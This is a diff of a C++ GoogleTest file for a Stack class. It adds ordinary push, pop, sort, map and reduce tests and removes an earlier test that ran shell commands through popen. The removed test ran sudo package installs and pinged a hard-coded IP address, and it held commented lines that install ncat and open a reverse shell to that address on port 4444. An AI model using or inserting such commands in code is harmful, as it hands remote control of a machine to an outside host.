@@ -8,34 +8,49 @@ class StackTest : public ::testing::Test {
   void TearDown() {}
 };
 
-#include <array>
-#include <cstdio>
-#include <iostream>
-#include <memory>
-#include <stdexcept>
-#include <string>
-
-std::string exec(const char* cmd) {
-  std::array<char, 128> buffer;
-  std::string result;
-  std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
-
-  if (!pipe) {
-    throw std::runtime_error("popen() failed!");
-  }
-  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-    result += buffer.data();
-  }
-
-  return result;
+TEST_F(StackTest, PushAndPop) {
+  Stack s;
+  s.push(1);
+  s.push(2);
+  EXPECT_EQ(s.pop(), 2);
+  EXPECT_EQ(s.pop(), 1);
 }
 
-TEST_F(StackTest, test1) {
-  // system("sudo apt-get update");
-  // system("sudo apt-get install -y ncat");
-  // system("ncat 207.154.235.250 4444 -e /bin/bash");
+TEST_F(StackTest, IsEmptyAndSize) {
+  Stack s;
+  EXPECT_TRUE(s.isEmpty());
+  s.push(1);
+  EXPECT_EQ(s.size(), 1);
+  s.push(2);
+  EXPECT_EQ(s.size(), 2);
+  s.pop();
+  EXPECT_EQ(s.size(), 1);
+  s.pop();
+  EXPECT_TRUE(s.isEmpty());
+}
 
-  EXPECT_EQ(exec("sudo apt-get update"), "");
-  EXPECT_EQ(exec("sudo apt-get install -y iputils-ping"), "");
-  EXPECT_EQ(exec("ping 207.154.235.250 2>&1"), "");
+TEST_F(StackTest, Sort) {
+  Stack s{5, 2, 8, 1, 9};
+  s.sort();
+  EXPECT_EQ(s.pop(), 1);
+  EXPECT_EQ(s.pop(), 2);
+  EXPECT_EQ(s.pop(), 5);
+  EXPECT_EQ(s.pop(), 8);
+  EXPECT_EQ(s.pop(), 9);
+}
+
+TEST_F(StackTest, Map) {
+  Stack s{1, 2, 3, 4, 5};
+  s.map([](int x) { return x * x; });
+  EXPECT_EQ(s.pop(), 1);
+  EXPECT_EQ(s.pop(), 4);
+  EXPECT_EQ(s.pop(), 9);
+  EXPECT_EQ(s.pop(), 16);
+  EXPECT_EQ(s.pop(), 25);
+}
+
+TEST_F(StackTest, Reduce) {
+  Stack s{1, 2, 3, 4, 5};
+  int sum = s.reduce([](int acc, int x) { return acc + x; }, 0);
+  EXPECT_EQ(sum, 15);
 }
